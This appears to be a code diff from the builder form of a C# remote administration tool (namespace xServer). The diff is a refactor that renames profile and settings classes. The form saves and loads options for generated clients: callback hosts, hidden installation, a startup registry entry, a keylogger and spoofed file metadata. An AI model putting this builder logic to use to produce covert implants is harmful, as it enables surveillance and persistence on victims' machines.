@@ -5,9 +5,9 @@ using System.IO;
 using System.Linq;
 using System.Windows.Forms;
 using xServer.Core.Build;
+using xServer.Core.Data;
 using xServer.Core.Helper;
 using xServer.Core.Utilities;
-using xServer.Settings;
 
 namespace xServer.Forms
 {
@@ -24,69 +24,69 @@ namespace xServer.Forms
 
         private void LoadProfile(string profilename)
         {
-            ProfileManager pm = new ProfileManager(profilename + ".xml");
-            var rawHosts = pm.ReadValueSafe("Hosts");
+            var profile = new BuilderProfile(profilename + ".xml");
+            var rawHosts = profile.ReadValueSafe("Hosts");
             foreach (var host in HostHelper.GetHostsList(rawHosts))
                 _hosts.Add(host);
             lstHosts.DataSource = new BindingSource(_hosts, null);
-            txtTag.Text = pm.ReadValueSafe("Tag", "Office04");
-            txtPassword.Text = pm.ReadValueSafe("Password", XMLSettings.Password);
-            txtDelay.Text = pm.ReadValueSafe("Delay", "5000");
-            txtMutex.Text = pm.ReadValueSafe("Mutex", FormatHelper.GenerateMutex());
-            chkInstall.Checked = bool.Parse(pm.ReadValueSafe("InstallClient", "False"));
-            txtInstallname.Text = pm.ReadValueSafe("InstallName", "Client");
-            GetInstallPath(int.Parse(pm.ReadValueSafe("InstallPath", "1"))).Checked = true;
-            txtInstallsub.Text = pm.ReadValueSafe("InstallSub", "SubDir");
-            chkHide.Checked = bool.Parse(pm.ReadValueSafe("HideFile", "False"));
-            chkStartup.Checked = bool.Parse(pm.ReadValueSafe("AddStartup", "False"));
-            txtRegistryKeyName.Text = pm.ReadValueSafe("RegistryName", "Client Startup");
-            chkIconChange.Checked = bool.Parse(pm.ReadValueSafe("ChangeIcon", "False"));
-            chkChangeAsmInfo.Checked = bool.Parse(pm.ReadValueSafe("ChangeAsmInfo", "False"));
-            chkKeylogger.Checked = bool.Parse(pm.ReadValueSafe("Keylogger", "False"));
-            txtProductName.Text = pm.ReadValueSafe("ProductName");
-            txtDescription.Text = pm.ReadValueSafe("Description");
-            txtCompanyName.Text = pm.ReadValueSafe("CompanyName");
-            txtCopyright.Text = pm.ReadValueSafe("Copyright");
-            txtTrademarks.Text = pm.ReadValueSafe("Trademarks");
-            txtOriginalFilename.Text = pm.ReadValueSafe("OriginalFilename");
-            txtProductVersion.Text = pm.ReadValueSafe("ProductVersion");
-            txtFileVersion.Text = pm.ReadValueSafe("FileVersion");
+            txtTag.Text = profile.ReadValueSafe("Tag", "Office04");
+            txtPassword.Text = profile.ReadValueSafe("Password", Settings.Password);
+            txtDelay.Text = profile.ReadValueSafe("Delay", "5000");
+            txtMutex.Text = profile.ReadValueSafe("Mutex", FormatHelper.GenerateMutex());
+            chkInstall.Checked = bool.Parse(profile.ReadValueSafe("InstallClient", "False"));
+            txtInstallname.Text = profile.ReadValueSafe("InstallName", "Client");
+            GetInstallPath(int.Parse(profile.ReadValueSafe("InstallPath", "1"))).Checked = true;
+            txtInstallsub.Text = profile.ReadValueSafe("InstallSub", "SubDir");
+            chkHide.Checked = bool.Parse(profile.ReadValueSafe("HideFile", "False"));
+            chkStartup.Checked = bool.Parse(profile.ReadValueSafe("AddStartup", "False"));
+            txtRegistryKeyName.Text = profile.ReadValueSafe("RegistryName", "Client Startup");
+            chkIconChange.Checked = bool.Parse(profile.ReadValueSafe("ChangeIcon", "False"));
+            chkChangeAsmInfo.Checked = bool.Parse(profile.ReadValueSafe("ChangeAsmInfo", "False"));
+            chkKeylogger.Checked = bool.Parse(profile.ReadValueSafe("Keylogger", "False"));
+            txtProductName.Text = profile.ReadValueSafe("ProductName");
+            txtDescription.Text = profile.ReadValueSafe("Description");
+            txtCompanyName.Text = profile.ReadValueSafe("CompanyName");
+            txtCopyright.Text = profile.ReadValueSafe("Copyright");
+            txtTrademarks.Text = profile.ReadValueSafe("Trademarks");
+            txtOriginalFilename.Text = profile.ReadValueSafe("OriginalFilename");
+            txtProductVersion.Text = profile.ReadValueSafe("ProductVersion");
+            txtFileVersion.Text = profile.ReadValueSafe("FileVersion");
             _profileLoaded = true;
         }
 
         private void SaveProfile(string profilename)
         {
-            ProfileManager pm = new ProfileManager(profilename + ".xml");
-            pm.WriteValue("Tag", txtTag.Text);
-            pm.WriteValue("Hosts", HostHelper.GetRawHosts(_hosts));
-            pm.WriteValue("Password", txtPassword.Text);
-            pm.WriteValue("Delay", txtDelay.Text);
-            pm.WriteValue("Mutex", txtMutex.Text);
-            pm.WriteValue("InstallClient", chkInstall.Checked.ToString());
-            pm.WriteValue("InstallName", txtInstallname.Text);
-            pm.WriteValue("InstallPath", GetInstallPath().ToString());
-            pm.WriteValue("InstallSub", txtInstallsub.Text);
-            pm.WriteValue("HideFile", chkHide.Checked.ToString());
-            pm.WriteValue("AddStartup", chkStartup.Checked.ToString());
-            pm.WriteValue("RegistryName", txtRegistryKeyName.Text);
-            pm.WriteValue("ChangeIcon", chkIconChange.Checked.ToString());
-            pm.WriteValue("ChangeAsmInfo", chkChangeAsmInfo.Checked.ToString());
-            pm.WriteValue("Keylogger", chkKeylogger.Checked.ToString());
-            pm.WriteValue("ProductName", txtProductName.Text);
-            pm.WriteValue("Description", txtDescription.Text);
-            pm.WriteValue("CompanyName", txtCompanyName.Text);
-            pm.WriteValue("Copyright", txtCopyright.Text);
-            pm.WriteValue("Trademarks", txtTrademarks.Text);
-            pm.WriteValue("OriginalFilename", txtOriginalFilename.Text);
-            pm.WriteValue("ProductVersion", txtProductVersion.Text);
-            pm.WriteValue("FileVersion", txtFileVersion.Text);
+            var profile = new BuilderProfile(profilename + ".xml");
+            profile.WriteValue("Tag", txtTag.Text);
+            profile.WriteValue("Hosts", HostHelper.GetRawHosts(_hosts));
+            profile.WriteValue("Password", txtPassword.Text);
+            profile.WriteValue("Delay", txtDelay.Text);
+            profile.WriteValue("Mutex", txtMutex.Text);
+            profile.WriteValue("InstallClient", chkInstall.Checked.ToString());
+            profile.WriteValue("InstallName", txtInstallname.Text);
+            profile.WriteValue("InstallPath", GetInstallPath().ToString());
+            profile.WriteValue("InstallSub", txtInstallsub.Text);
+            profile.WriteValue("HideFile", chkHide.Checked.ToString());
+            profile.WriteValue("AddStartup", chkStartup.Checked.ToString());
+            profile.WriteValue("RegistryName", txtRegistryKeyName.Text);
+            profile.WriteValue("ChangeIcon", chkIconChange.Checked.ToString());
+            profile.WriteValue("ChangeAsmInfo", chkChangeAsmInfo.Checked.ToString());
+            profile.WriteValue("Keylogger", chkKeylogger.Checked.ToString());
+            profile.WriteValue("ProductName", txtProductName.Text);
+            profile.WriteValue("Description", txtDescription.Text);
+            profile.WriteValue("CompanyName", txtCompanyName.Text);
+            profile.WriteValue("Copyright", txtCopyright.Text);
+            profile.WriteValue("Trademarks", txtTrademarks.Text);
+            profile.WriteValue("OriginalFilename", txtOriginalFilename.Text);
+            profile.WriteValue("ProductVersion", txtProductVersion.Text);
+            profile.WriteValue("FileVersion", txtFileVersion.Text);
         }
 
         private void FrmBuilder_Load(object sender, EventArgs e)
         {
             LoadProfile("Default");
 
-            txtPort.Text = XMLSettings.ListenPort.ToString();
+            txtPort.Text = Settings.ListenPort.ToString();
 
             UpdateControlStates();
 
